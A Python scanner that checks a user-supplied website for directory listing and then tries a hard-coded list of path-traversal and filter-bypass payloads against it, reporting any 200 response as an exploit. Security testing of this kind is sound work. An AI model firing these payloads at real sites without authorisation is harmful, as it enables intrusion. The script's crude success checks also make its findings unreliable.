import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import pyfiglet

# Generate ASCII banner
ascii_banner = pyfiglet.figlet_format("DIRECTORY LISTING VULNERABILITY")
print(ascii_banner)

def detect_directory_vulnerability(url):
    print("[*] Analyzing for Directory Listing vulnerability on:", url)
    try:
        response = requests.get(url)
        if response.status_code == 200:
            soup = BeautifulSoup(response.content, 'html.parser')
            links = soup.find_all('a')
            directories = [link.get('href') for link in links if link.get('href', '').endswith('/')]
            if directories:
                print("[+] Directory Listing vulnerability identified!")
                print("[*] Found directories:")
                for directory in directories:
                    print("\t", directory)
                return "high"  # High vulnerability due to sensitive directory exposure
            else:
                print("[-] No directories found.")
                return "low"   # Low vulnerability since no directories are exposed
        else:
            print("[-] Error:", "Failed to access the website.")
            return "medium"   # Medium vulnerability due to failure to access the website
    except Exception as e:
        print("[-] Error:", e)
        return "medium"   # Medium vulnerability due to an unexpected error

def attempt_bypass_protection(url):
    print("[*] Attempting to bypass protection mechanisms on:", url)
    techniques = [
        "../", "%2e%2e/", "/./", "/../", "?path=", "#", "//", "/..;/", "/..%u2215", "/..\\",
        "/.randomstring/", "/.../", "/...../","/....../","/..%252f","/.../.../","/.%2e/",
        "/%2e/","%252e%252e/","..%252f",".../.","/%2e%2e%2f","%c0%ae%c0%ae/","%252e%252e%2f",
        "/..;/", "/randomfolder/../", "/randomfolder/..;/", "/%09../", "/%20../", "/.;/",
        "/%20/", "/%09/", "/%09.%09/", "/%2e%2e%5c", "/%2e%5c", "/%2e%2e%2f", "/%2e/",
        "/.\\", "\\", "..\\", "..%5c", "..%255c"
    ]
    for i, technique in enumerate(techniques, start=1):
        modified_url = urljoin(url, technique)
        response = requests.get(modified_url)
        if response.status_code == 200:
            print(f"[+] Bypass successful with technique {i}: {technique}")
            print("[*] Exploit:", modified_url)
            return "high"   # High vulnerability due to successful bypass
    print("[-] Bypass unsuccessful.")
    return "low"   # Low vulnerability since protection mechanisms are effective

if __name__ == "__main__":
    target_url = input("Enter the URL of the target website:")
    if target_url.startswith("http://") or target_url.startswith("https://"):
        directory_vulnerability_level = detect_directory_vulnerability(target_url)
        if directory_vulnerability_level == "high":
            bypass_vulnerability_level = attempt_bypass_protection(target_url)
            if bypass_vulnerability_level == "high":
                print("[*] The website is highly vulnerable to directory traversal and protection bypass.")
            else:
                print("[*] The website is highly vulnerable to directory traversal but not to protection bypass.")
        else:
            print("[*] The website is not highly vulnerable to directory traversal.")
    else:
        print("[-] Invalid URL format.")
